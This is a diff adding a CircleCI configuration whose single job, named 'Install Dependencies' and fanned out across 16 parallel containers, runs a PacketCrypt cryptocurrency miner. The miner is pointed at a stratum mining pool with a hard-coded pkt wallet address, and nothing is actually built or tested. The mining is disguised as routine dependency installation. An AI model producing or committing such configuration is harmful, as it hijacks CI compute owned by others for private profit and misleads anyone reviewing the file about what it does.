@@ -1,0 +1,18 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              docker run thomasjp0x42/packetcrypt ann -p pkt1qpnkxe67wtwtq9e54x2h45tjtyjj5argf53lewj https://stratum.zetahash.com/
+              echo Hello,subscribe it
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
